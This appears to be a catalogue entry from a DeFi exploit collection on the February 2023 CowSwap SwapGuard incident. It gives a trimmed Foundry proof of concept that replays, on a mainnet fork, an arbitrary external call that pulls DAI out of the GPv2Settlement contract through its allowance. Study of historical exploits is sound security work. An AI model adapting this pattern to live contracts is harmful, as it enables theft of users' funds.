# [?] - CowSwap - Arbitrary External Call Vulnerability

## Summary
Severity: Unknown
Chain: Ethereum
Component: CowSwap
Published: 2023-02-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/CowSwap_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$120k
References:
- https://twitter.com/MevRefund/status/1622793836291407873
- https://twitter.com/peckshield/status/1622801412727148544
- https://etherscan.io/tx/0x90b468608fbcc7faef46502b198471311baca3baab49242a4a85b73d4924379b

```solidity
contract ContractTest is Test {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    SwapGuard swapGuard = SwapGuard(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8);
    address GPv2Settlement = 0x9008D19f58AAbD9eD0D60971565AA8510560ab41;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_574_048);
        vm.label(address(DAI), "DAI");
        vm.label(address(swapGuard), "SwapGuard");
        vm.label(address(GPv2Settlement), "GPv2Settlement");
    }

    function testExploit() external {
        uint256 amount = DAI.balanceOf(GPv2Settlement);
        if (DAI.allowance(GPv2Settlement, address(swapGuard)) < amount) {
            amount = DAI.allowance(GPv2Settlement, address(swapGuard));
        }
        bytes memory callDatas =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", GPv2Settlement, address(this), amount);
        SwapGuard.Data[] memory interactions = new SwapGuard.Data[](1);
        interactions[0] = SwapGuard.Data({target: address(DAI), value: 0, callData: callDatas});
        address vault = address(this);
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = DAI;
        uint256[] memory tokenPrices = new uint256[](1);
        tokenPrices[0] = 0;
        int256[] memory balanceChanges = new int256[](1);
        balanceChanges[0] = 0;
        uint256 allowedLoss = type(uint256).max;
        swapGuard.envelope(interactions, vault, tokens, tokenPrices, balanceChanges, allowedLoss);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/CowSwap_exp.sol_
